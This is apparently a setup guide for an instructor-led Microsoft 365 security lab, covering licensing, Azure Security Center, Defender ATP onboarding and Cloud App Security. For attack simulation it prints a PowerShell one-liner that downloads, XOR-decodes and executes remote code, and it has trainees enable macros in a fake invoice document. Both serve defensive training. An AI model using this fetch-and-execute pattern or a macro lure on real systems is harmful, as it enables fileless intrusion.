# Implementing Microsoft 365 Security Technologies

## INSTRUCTOR LED LAB - M365HOL

### Introduction

This lab is designed to be used as a supplement to Instructor Led Training and has several sections that you will go through over the next few days. Some initial setup is required before getting into the hands-on labs.

# Lab Environment Configuration
[:arrow_left: Home](#introduction)

There are a few prerequisites that need to be set up to complete all the sections in this lab.  This Exercise will walk you through the items below.

- [Link Windows Defender ATP Licenses](#link-windows-defender-atp-licenses)

- [Redeem Azure Pass](#redeem-azure-pass)

- [Azure AD User Configuration](#azure-ad-user-configuration)

- [Azure Security Center Setup](#azure-security-center-setup)
  
- [Windows Defender ATP Onboarding](#windows-defender-atp-onboarding)

- [Workplace Join Clients](#workplace-join-clients)

- [MCAS Environment Proparation](#mcas-environment-preparation)
  
- [Complete Azure Security Center Deployment](#complete-azure-security-center-deployment)


## Link Windows Defender ATP Licenses
[:arrow_left: Home](#lab-environment-configuration)

In this task, we will link Windows Defender ATP licenses to your demo tenant.

1. Log into your Windows 10 client
2. Right-click on **Edge** in the taskbar and click on **New InPrivate window**.

3. In the in a Private window, paste the **provided Windows E5 Trial Sign up link**.
	
1. Click **Sign in** and use your Global Admin Credentials

	!IMAGE[Open Screenshot](\Media\signin.png)
	
2. On the Check out page, click **Try now**.

	!IMAGE[Open Screenshot](\Media\wlgzkp40.jpg)
1. On the Order Receipt page, click **Continue**.

1. Next, click on **Active Users >** or navigate to ```https://admin.microsoft.com/AdminPortal/Home#/users```.

1. Click on your Global Administrator account, and in the details page, click **Edit** next to Product licenses.

	!IMAGE[fe5k7wwn.jpg](\Media\fe5k7wwn.jpg)
1. Toggle the **WD ATP** license to On and click **Save**.

	!IMAGE[6crecugz.jpg](\Media\6crecugz.jpg)

---

## Redeem Azure Pass
[:arrow_left: Home](#lab-environment-configuration)

For several of the exercises in this lab series, you will require an active subscription.  We are providing an Azure Pass for this purpose.  You will be provided with an Azure Pass code to use with the instructions below.

### Redeeming a Microsoft Azure Pass Promo Code:

1. On your Windows 10 client, right-click on **Edge** in the taskbar and click on **New InPrivate window**.

3. In the InPrivate window, navigate to ```https://www.microsoftazurepass.com```

4. Click the **Start** button to get started.

	> !IMAGE[wdir7lb3.jpg](\Media\wdir7lb3.jpg)
1. Log in using your Global Admin Credentials

1. Click **Confirm** if the correct email address is listed.

	> !IMAGE[teyx280d.jpg](\Media\teyx280d.jpg)
7. Click in the Promo code box and paste the provided Azure Pass Promo Code, then click the **Claim Promo Code** button.

	> !IMAGE[e1l35ko2.jpg](\Media\e1l35ko2.jpg)

	>[!NOTE] It may take up to 5 minutes to process the redemption.

1. While waiting for this to process, continue to the next exercise.

---

## Azure AD User Configuration
[:arrow_left: Home](#lab-environment-configuration)

In this task, we will create new Azure AD users and assign licenses via PowerShell.  In a procduction evironment this would be done using Azure AD Connect or a similar tool to maintain a single source of authority, but for lab purposes we are doing it via script to reduce setup time.

1. Browse to C:\Scripts, **right-click** on **AADConfig.ps1**, and click **Run with PowerShell**.

1. When prompted for the **Tenant name**, **click in the text box** and enter the name of your tenant.
1. When prompted for credentials, provide your Global Admin credentials.
   
	> [!KNOWLEDGE] We are running the PowerShell code below to create the accounts and groups in AAD and assign licenses for EMS E5 and Office E5. This script is also available at [https://aka.ms/labscripts](https://aka.ms/labscripts) as AADConfig.ps1.
    
	> [!NOTE] The PowerShell window will automatically close once users have been created and licenses have been assigned

---


## Complete Azure Pass Signup

1. Back in the Azure Pass signup browser window, scroll to the bottom of the page and click **Next**.

    > !IMAGE[ihrjazqi.jpg](\Media\ihrjazqi.jpg)

	>[!NOTE] You can keep the pre-populated information.

9. Check the box to agree to the terms and click **Sign up**.

	> !IMAGE[k2a97g8e.jpg](\Media\k2a97g8e.jpg)

	> [!NOTE] It may take a few minutes to process the request. Once you are redirected to the Azure Portal, you may continue to the next section.

---


# Azure Security Center Setup
[:arrow_left: Home](#lab-environment-configuration)

## VM and Workspace Deployment

This section is intended to deploy dependency Azure resources in an automated way to get you started quickly or in case you need to re-provision your environment.

***Additional notes**:*
- Close the Azure Advisor recommendations if that opens for you.
- When deploying the template below, a number of fields are locked to ensure that the references in the labs are accurate. You are free to choose your location for deployment

### Deploy VMs and Create a Workspace
Use the link below to deploy the following:
- A Log Analytics workspace (ASC-Workspace-xxxx)
- Security Center OMS solution
- 2 Windows VM's (*Win-x*, connected to the workspace)
- 2 Linux Ubuntu VM's (*Linux-x*, connected to the workspace) 

>[!NOTE] Because we are deploying the Security Center solution in the workspace, the VM's will become security managed by Security Center.

1. Switch to your Windows 10 client and log in with the password ```@lab.VirtualMachine(Client01).Password```.
1. Open a new tab and navigate to ```https://portal.azure.com/#create/Microsoft.Template/uri/https%3A%2F%2Fraw.githubusercontent.com%2Ftianderturpijn%2FAzure-Security-Center%2Fmaster%2FLabs%2F01%2520-%2520VM%2520and%2520Workspace%2520Deployment%2FFiles%2FdeployAscManagedVmsWithLA.json```

	> [!KNOWLEDGE] If needed, log in using the credentials below:
	>
	>```@lab.CloudCredential(134).Username```
	>
	>```@lab.CloudCredential(134).Password```

1. On the Custom deployment page, below the **Resource group** drop-down, click **Create new**.

	!IMAGE[NewRG.png](\Media\NewRG.png)
1. When prompted for a Name, provide a name such as ```ASC-Labs``` and press **OK**.

	!IMAGE[Open Screenshot](\Media\RGName.png)
1. Under Location, choose **East US**.

	> [!ALERT] Ensure that you have chosen East US (or a datacenter near the event) or the workspace will take longer to deploy and the VMs will have latency.

1. **Select a location**, then under **Settings**, next to **Pwd Or Ssh** type the password ```Securitycenter4ever!```.
1. Finally, check the Box to agree to the terms and click **Purchase**.

	!IMAGE[Open Screenshot](\Media\Password.png)

1. The deployment takes about **13 minutes**. **Continue to the next task** and we will return to the ASC deployment later.


# Windows Defender ATP Onboarding
[:arrow_left: Home](#lab-environment-configuration)

In this task, we will perform initial setup of WD ATP and onboard 2 machines.  

1. Switch to @lab.VirtualMachine(AdminPC).SelectLink and log in with the password ```@lab.VirtualMachine(AdminPC).Password```.

1. Open an Edge InPrivate window and navigate to ```https://securitycenter.windows.com```.
1. Log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```

1. On Step 1, click **Next**.
1. On Step 2, choose a data storage location and click **Next**.
1. On Step 3, click **Next** several times until the Create your cloud instance dialog pops up, then click **Continue**.
1. On Step 4, click the **Download package** button and save the package to your desktop.
1. **Extract the zip file** to your desktop.
1. Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
1. In the Windows protected your PC dialog, click the **More info** link and click **Run anyway**.
1. In the User Account Control (UAC) window, click on **More choices** and select use a different account.

	> [!NOTE] If you do not see the UAC window, minimize all windows and it will be in the background.
1. Enter the credentials below and click **Yes**:

	```LabUser```

	```Pa$$w0rd```

1. Press **(Y)** to confirm onboarding.
2. Return to the browser, scroll to the bottom of the page, and click **Start using Windows Defender ATP**.
1. Click **Proceed anyway** if you receive a Setup incomplete popup.
3. In the Windows Defender Security Center, click on **Settings > Advanced Features** and toggle the switches on for **Azure ATP integration**, **Office 365 Threat Intelligence Connection**, **Microsoft Cloud App Security**, and **Azure Information Protection** and press the **Save preferences** button at the bottom of the page.
	
	!IMAGE[g47p8c30.jpg](\Media\wdatpadv.png)

1. Switch to @lab.VirtualMachine(VictimPC).SelectLink and log in with the password ```@lab.VirtualMachine(VictimPC).Password```.

1. Open an Edge InPrivate window and navigate to ```https://securitycenter.windows.com/```.
1. Log in using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```
1. On the left, click the **Settings** icon.

	!IMAGE[settings.png](\Media\settings.png)

3. On the Settings page, under **Machine management**, click **Onboarding**.
   
	!IMAGE[Open Screenshot](\Media\onboarding.png)

1. Click **Download package** and **Open** when the download dialog pops up.
2. Copy the **WindowsDefenderATPLocalOnboardingScript** to the desktop.
3. Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
1. If you get the Windows protected your PC dialog, click the **More info** link and click **Run anyway**.
4. Press **(Y)** to confirm onboarding.
5. To run **Attack Simulation #1 "Automated investigation (fileless attack)"**, right-click **on AttackSimulation1.ps1** on the desktop, and click **Run with PowerShell**.

	> [!NOTE] A notepad window will launch to show that the attack was successful. Leave the notepad window open and continue with the lab.
	
	> [!KNOWLEDGE] The powershell commands that are included in the ps1 file are in the block below.
	> 
	> \[Net.ServicePointManager\]::SecurityProtocol = \[Net.SecurityProtocolType\]::Tls12;$xor = \[System.Text.Encoding\]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = \[System.Convert\]::FromBase64String($base64String) } Catch { $contentBytes = \[System.Convert\]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression (\[System.Text.Encoding\]::UTF8.GetString($decryptedBytes))

1. Switch to @lab.VirtualMachine(AdminPC).SelectLink and log in with the password ```@lab.VirtualMachine(AdminPC).Password```.
1. Run **Attack Simulation #2 "Automated investigation (backdoor)"** by following the instructions below:
	1. On the desktop, double-click on **RS4_WinATP-Intro-Invoice.docm** and enter ```WDATP!diy#``` when prompted for a password.

		> [!ALERT] If you receive an activation warning, click **Cancel**.

	2. Once the file opens, in the Security Warning ribbon at the top of the document, click **Enable Content**.
	3. Click **OK** to confirm the attack.
	4. Wait about a minute, then **close the generated command prompt** window.

## Workplace Join Clients
[:arrow_left: Home](#lab-environment-configuration)

In this task, we will join 3 systems to the Azure AD tenant to provide SSO capabilities in Office.

1. Log into your Windows 10 client.
1. Right-click on the start menu and click **Run**.
1. In the Run dialog, type ```ms-settings:workplace``` and click **OK**.

	>!IMAGE[mssettings.png](\Media\mssettings.png)

1. In the Access Work or School settings menu, click on **+ Connect** and enter the credentials below to workplace join the client.

	```adamj@@lab.CloudCredential(134).TenantName```
		
	```pass@word1```
1. Click **Done**.

1. Log into @lab.VirtualMachine(Client02).SelectLink using the password ```@lab.VirtualMachine(Client01).Password```.
1. Right-click on the start menu and click **Run**.
1. In the Run dialog, type ```ms-settings:workplace``` and click **OK**.

	!IMAGE[Open Screenshot](\Media\mssettings.png)

1. In the Access Work or School settings menu, click on **+ Connect** and enter the credentials below to workplace join the client.

	```alicea@@lab.CloudCredential(134).TenantName```
		
	```pass@word1```
1. Click **Done**.

1. Log into @lab.VirtualMachine(Client03).SelectLink using the password ```@lab.VirtualMachine(Client01).Password```.
1. Right-click on the start menu and click **Run**.
1. In the Run dialog, type ```ms-settings:workplace``` and click **OK**.

	!IMAGE[Open Screenshot](\Media\mssettings.png)

1. In the Access Work or School settings menu, click on **+ Connect** and enter the credentials below to workplace join the client.

	```evang@@lab.CloudCredential(134).TenantName```
		
	```pass@word1```
1. Click **Done**.


## MCAS Environment Preparation
[:arrow_left: Home](#lab-environment-configuration)

There are a few prerequisites that need to be set up to complete all the sections in this lab. This Exercise will walk you through the items below.

To be able to complete the different parts of the Cloud App Security labs, the following configuration steps are required. 

* [Enabling File Monitoring](#enabling-file-monitoring)
* [Create a Developer Box Account](#create-a-developer-box-account)
* [Connecting Box to Cloud App Security](#connecting-box-to-cloud-app-security)
* [Enabling Azure Information Protection integration](#enabling-azure-information-protection-integration)

---

## Enabling File Monitoring
[:arrow_up: Top](#lab-environment-configuration)

1. On your Windows 10 client log in with the password ```@lab.VirtualMachine(Client01).Password```.

1. In the InPrivate window, open a new tab and browse to ```https://portal.cloudappsecurity.com``` and click on the **Gear** and then **Settings**.

	> [!NOTE] If necessary, log in using the credentials below:
	> 
	> ```@lab.CloudCredential(134).Username```
	>
	> ```@lab.CloudCredential(134).Password```

    !IMAGE[Settings](\Media\conf-settings.png "Settings")

1. Under the **Information Protection** section click on **Files** and verify that the **Enable file monitoring** checkbox is checked.  If it is not, check the box and click on the "**Save** button.

    !IMAGE[Enable files](\Media\conf-files.png "Enable files")

---

## Create a Developer Box Account
[:arrow_up: Top](#lab-environment-configuration)

1. Next, open a new tab in your browser and navigate to ```https://developer.box.com``` and click on **Get Started**. 

	!IMAGE[Boxdev](\Media\box-getstarted.png)

2. **Enter the values** from the table below, **check the box** to solve the captcha, and click **Submit**.

	|||
	|-----|-----|
	|**Full Name**|```MOD Admin```|
	|**Email Address**|```@lab.CloudCredential(134).UserName```|

	!IMAGE[Open Screenshot](\Media\box-signup.png)

3. In a new tab, browse to ```https://outlook.office365.com/OWA```. 
1. If prompted, choose a time zone and click **Save**.
1. In the MOD Admin inbox, click on **Other** mail, search for the **Box** confirmation email and click the **Verify Email**. link in the email from Box.

	!IMAGE[Open Screenshot](\Media\box-verify.png)

1. In the new window that opens, enter the password to use with **Box**. We'll use ```@lab.CloudCredential(134).password``` in **each of the password boxes**. Click the **Update** button to save your password.

1. You can now close the **Box** and **Office 365 mailbox** tabs.

---

## Connecting Box to Cloud App Security
[:arrow_up: Top](#lab-environment-configuration)

1.  Click on the **+** button, and click on **Box**.

	!IMAGE[2](\Media\box-connect.png)

1. In the Instance name box, type ```Box API Demo```, and click **Connect Box**.

	!IMAGE[Open Screenshot](\Media\apiBox3.JPG)

1. In the Connect Box dialog, click **follow this link**.

	!IMAGE[4](\Media\box-follow.png)

1. Log into Box using the credentials below:

	```@lab.CloudCredential(134).Username```

	```@lab.CloudCredential(134).Password```

1. Click on the **Authorize** button.

1. Click on **Grant access to Box**

	!IMAGE[Open Screenshot](\Media\box-grant.png)

1. Close the Connect Box dialog and click on **Box API Demo** to expand.

	> [!NOTE] If you do not see Box API Demo listed, refresh the page.

1. Click on the **Test now** button.

	!IMAGE[Open Screenshot](\Media\apiBox7.JPG)

	> [!KNOWLEDGE] Once the connection is succesful - it will say **Connected.** 
	>
	> !IMAGE[8](\Media\apiBox8.JPG)

1.  Close the dialog and you should be able to see **Box API Demo** as a **Connected** app in the list. 

	!IMAGE[Open Screenshot](\Media\apiBox9.JPG) 

	> [!NOTE] If testing is taking a long time, open a new tab to ```https://portal.cloudappsecurity.com``` and continue with the next section.

---

## Enabling Azure Information Protection integration
[:arrow_up: Top](#lab-environment-configuration)

To prepare the **Information Protection** lab, we have to enable the integration between Cloud App Security and Azure Information Protection as explained in the [Cloud App Security documentation](https://docs.microsoft.com/en-us/cloud-app-security/azip-integration). Enabling the integration between the two solutions is as easy as selecting one single checkBox.

1. Click on the **Gear** icon and then **Settings**.

    !IMAGE[Settings](\Media\conf-settings.png "Settings")

2. Go down in the settings to the **Azure Information Protection** section and check the **Automatically scan new files** checkBox and click on the "**Save** button.
    !IMAGE[Enable AIP](\Media\conf-aip.png "Enable AIP")

>[!NOTE]: It can take up to **1h** for Cloud App Security to sync the Azure Information classifications.

---


# Complete Azure Security Center Deployment
[:arrow_left: Home](#lab-environment-configuration)

Now that the template has been deployed, we can continue with the configuration of the Azure Security Center settings.

## Configure the data collection settings in ASC

1. On your Windows 10 client, open a new InPrivate window and navigate to ```https://portal.azure.com/#blade/Microsoft_Azure_Security/SecurityMenuBlade/18```.

2. In the Security Center - Getting started blade, scroll to the bottom of the main window and click on **Start Trial**.

	!IMAGE[Open Screenshot](\Media\StartTrial.png)
3. In the next pane, click on **Install agents**.

	!IMAGE[Open Screenshot](\Media\InstallAgent.png)
4. In the left-hand pane, under POLICY & COMPLIANCE, click on **Security policy**.

	!IMAGE[SecPol](\Media\SecPol.png)
1. On the line where it lists your **workspace**, click on **Edit settings**.

	!IMAGE[settings](\Media\asc-edit1.png)
10. In the left pane, under Policy components, click on **Pricing tier**.
1. Select **Standard** and click on **Save**.

	!IMAGE[Open Screenshot](\Media\Pricing.png)
13. Click on Data collection and select **All Events** and click on **Save**. 

	!IMAGE[Open Screenshot](\Media\DC.png)
10. At the top, click on **Security Center - Security Policy** and click **OK** to dismiss the message **Your unsaved edits will be discarded**.

	!IMAGE[SecPol](\Media\SC2.png)
6. On the line where it lists **Azure Pass - Sponsorship**, click on **Edit settings**.

	!IMAGE[Open Screenshot](\Media\EditSettings.png)

	> [!NOTE] If you do not see the Azure Pass listed, wait a minute and refresh the browser and it should display.

7. Verify that **Auto Provisioning** is set to **On**.
8. Under Workspace configuration, select the option button for **Use another workspace**, and select your workspace **ASC-Workspace-xxxx** (which has been created by the template).

	!IMAGE[Open Screenshot](\Media\Workspace.png)
1. Under Windoews secuity events, select **All events**.
9. Click on **Save** at the top of the page.
9. Click on **Yes** on **Would you like to reconfigure monitored VMs?**.
10. Click on **Pricing tier** on the left and click **OK** to ignore the dialog.
11. Under Settings - Pricing tier, verify that it is set to **Standard**.  If not, select **Standard** and click **Save**.

>[!HINT] It can take some time for the resources (VMs) to become visible in Security Center.

---


# Lab Environment Setup Complete
[:arrow_left: Home](#introduction)

The lab environment setup is now complete. The next section will cover Azure Information Protection (Roadmap discussion then Hands On Lab). If you decide to close out of the Lab during the roadmap discussion, please ensure that you **Save** the lab using the menu in the upper right corner of the browser.

!IMAGE[Save](\Media\save.png)

